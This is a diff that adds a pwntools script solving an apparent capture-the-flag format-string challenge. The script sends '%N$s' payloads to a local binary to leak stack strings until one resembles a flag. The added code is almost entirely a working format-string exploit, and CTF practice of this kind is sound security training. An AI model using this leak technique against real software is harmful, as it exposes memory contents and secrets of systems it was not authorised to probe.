@@ -102,3 +102,61 @@
  'recognizable format (e.g., contains the word "flag" or curly braces `{}`). '
  'Adjust the conditions in the code based on the actual flag format used in '
  'your challenge.')
+
+from pwn import *
+import string
+
+# Set the logging level to 'error' to minimize unnecessary output
+context.log_level = 'error'
+
+# Path to the binary
+binary_path = './pwn/string/fmt-2/fmt2'
+
+# Function to find the offset where the flag is located on the stack
+def find_flag_offset():
+    for offset in range(1, 40):
+        # Start the process
+        p = process(binary_path)
+        p.recvuntil("what's the flag\n")
+
+        # Craft the payload to read the string at the current offset
+        payload = f'%{offset}$s'
+        p.sendline(payload)
+
+        # Receive the response
+        response = p.recvuntil("But that was totally wrong lol get rekt").decode()
+        output = response.split('You answered:\n')[1].split('\nBut that was totally wrong')[0].strip()
+
+        # Check if the output is printable and potentially contains the flag
+        if output and all(c in string.printable for c in output):
+            print(f'Possible flag at offset {offset}: {output}')
+            # Check if the output resembles a flag (modify this condition based on flag format)
+            if "flag" in output.lower() or "{" in output:
+                p.close()
+                return offset
+
+        p.close()
+    return None
+
+# Find the offset of the flag on the stack
+flag_offset = find_flag_offset()
+
+if flag_offset:
+    print(f'Flag found at offset: {flag_offset}')
+
+    # Start the process again to extract the flag
+    p = process(binary_path)
+    p.recvuntil("what's the flag\n")
+
+    # Craft the payload to read the flag using the discovered offset
+    payload = f'%{flag_offset}$s'
+    p.sendline(payload)
+
+    # Receive the response
+    response = p.recvuntil("But that was totally wrong lol get rekt").decode()
+    flag = response.split('You answered:\n')[1].split('\nBut that was totally wrong')[0].strip()
+
+    print(f'Flag: {flag}')
+    p.close()
+else:
+    print('Flag offset not found.')
